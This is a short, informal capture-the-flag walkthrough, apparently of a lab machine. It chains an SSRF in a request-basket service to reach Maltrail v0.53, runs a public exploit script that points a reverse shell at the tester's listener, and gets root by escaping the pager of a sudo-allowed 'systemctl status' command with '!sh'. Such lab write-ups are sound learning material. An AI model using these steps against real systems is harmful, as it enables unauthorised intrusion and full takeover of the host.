after creating basket at IP:55555/
we can access basket and get redirected to IP:55555/web/basket

we try to intercept trafic with burpsuite :
	While configuring a basket theres a PUT request 	
After modfying the http request to forward url 127.0.0.1:80/ We get an OK 200 request backwards

after analyzing the website we notice :
Documentation page, Wiki page , Issue ,All of these clickable but the login page is not [1]
 
running a server called Maltrail v0.53 [2]
/*( Maltrail is a malicious traffic detection system, utilizing publicly available (black)lists containing malicious and/or generally suspicious trails, along with static trails compiled from various AV reports and custom user defined lists, where trail can be anything from domain name) 
*/

trying to access :55555/basket/login in url

theres a username;password input fields [3] and we see the maltrail again

after searching for maltrail v0.53 exploit we find :https://github.com/spookier/Maltrail-v0.53-Exploit
usage : python3 exploit.py [listening_IP] [listening_PORT] [target_URL]
python3 exploit.py <myIp> 1234 http://10.10.11.224:55555/basket/                it adds login automatically

cd ~ and cat the flag 

whoami  ->> puma so we need to get root access
sudo -l ->> User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
execute systemctl status trail.service -> sudo /usr/bin/systemctl status trail.service
 and run !sh to get root access 
cd /root and cat the flag.

	
 
